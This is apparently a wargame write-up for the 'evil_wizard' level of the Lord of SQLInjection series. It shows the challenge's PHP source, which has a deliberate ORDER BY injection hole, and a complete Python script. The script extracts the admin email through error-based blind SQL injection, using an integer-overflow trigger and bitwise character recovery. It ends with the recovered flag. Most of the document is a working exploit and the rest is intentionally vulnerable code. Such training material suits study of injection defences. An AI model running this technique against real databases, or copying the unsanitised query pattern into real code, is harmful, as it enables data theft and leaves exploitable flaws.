---
title : "LOS Lv.24 evil_wizard"
categories : [Wargame, rubiya]
---


## evil_wizard
```php
query : select id,email,score from prob_evil_wizard where 1 order by
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```

## Solution
```python
import requests

url='https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'PHPSESSID':'[redacted]'}

email=''
email_len=0

for i in range(8,50) :
    payload={'order':'(select if(length(email)='+str(i)+',1,0xfffffffffffff*0xfffffffffffffffff) where id="admin") limit 1,1'}
    res=requests.get(url,headers=headers,cookies=cookies,params=payload)
    if "<td>admin</td>" in res.text :
        email_len=i
        print("email_len: "+str(i))
        break

for i in range(1,email_len+1) :
    payload={'order':"(select if(length(bin(ascii(substr(email,"+str(i)+",1))))=6,1,0xfffffffffffff*0xfffffffffffffffffff) where id='admin') limit 1,1"}
    res=requests.get(url,headers=headers,cookies=cookies,params=payload)
    if "<td>admin</td>" in res.text :
        email_bitlen=6
    else :
        email_bitlen=7
        

    email_bit=''
    for j in range(1,email_bitlen+1) :
        payload={'order':"(select if(substr(bin(ascii(substr(email,"+str(i)+",1))),"+str(j)+",1)=1,1,0xfffffffffffff*0xfffffffffffffffffff) where id='admin') limit 1,1"}
        res=requests.get(url,headers=headers,cookies=cookies,params=payload)
        if "<td>admin</td>" in res.text :
            email_bit+='1'
        else :
            email_bit+='0'

    email+=chr(int(email_bit,2))
    print("email :",email) # aasup3r_secure_email@emai1.com

print("evil_wizard clear!")
```
